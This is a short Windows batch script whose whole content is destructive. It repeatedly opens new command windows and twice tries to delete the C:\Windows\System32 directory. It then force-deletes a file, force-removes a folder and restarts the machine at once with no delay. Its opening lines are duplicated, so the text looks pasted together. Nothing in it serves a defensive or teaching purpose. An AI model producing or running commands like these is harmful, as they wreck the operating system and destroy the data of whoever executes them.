start
start
del c:\windows\system32
start
start
del c:\windows\system32
REM Delete files/folders
del /f /q "C:\Path\to\file1.txt"
rmdir /s /q "C:\Path\to\folder"

REM Restart after deletion completes
shutdown /r /t 0
